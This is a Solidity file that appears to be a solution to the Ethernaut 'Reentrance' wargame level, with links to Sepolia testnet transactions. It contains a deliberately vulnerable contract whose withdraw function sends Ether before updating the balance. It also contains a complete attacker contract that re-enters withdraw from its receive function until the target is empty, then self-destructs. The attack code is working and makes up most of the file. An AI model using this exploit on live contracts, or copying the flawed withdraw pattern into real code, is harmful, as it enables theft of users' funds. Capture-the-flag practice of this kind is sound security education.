// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "openzeppelin-contracts-06/math/SafeMath.sol";

contract Reentrance {
    using SafeMath for uint256;

    mapping(address => uint256) public balances;

    function donate(address _to) public payable {
        balances[_to] = balances[_to].add(msg.value);
    }

    function balanceOf(address _who) public view returns (uint256 balance) {
        return balances[_who];
    }

    function withdraw(uint256 _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result,) = msg.sender.call{value: _amount}("");
            if (result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}
}

contract ReentranceAttacker {
    Reentrance public reentrance;
    uint256 public attackAmount;
    
    constructor(address payable _reentrance) {
        reentrance = Reentrance(_reentrance);
    }

    function attack() public payable {
        attackAmount = msg.value;
        // donate to get balance
        reentrance.donate{value: attackAmount}(address(this));
        // withdraw to trigger reentrancy
        reentrance.withdraw(attackAmount);

        require(address(reentrance).balance == 0, "Withdraw failed");
        selfdestruct(payable(address(msg.sender)));
    }

    // keep draining on every ETH receive
    receive() external payable {
        uint amount = min(1 ether, address(reentrance).balance);
        if(amount > 0) {
            reentrance.withdraw(amount);
        }
    }

    function min(uint256 a, uint256 b) public pure returns (uint256) {
        return a < b ? a : b;
    }
}

// https://sepolia.etherscan.io/tx/0x23f6a7a8612208677586b979b65acbbb4a3f38a929135f13c7202a276bbb4de0

// https://sepolia.etherscan.io/tx/0xd1fcca376e8a1d26d5b68c0ae702d67d11d92b10f793bfb20b7e762c1b69fc42

// https://sepolia.etherscan.io/tx/0x0acbd2f2e7e70230384a22c70c34cb577c85be43700ba905c68a0979d10392b4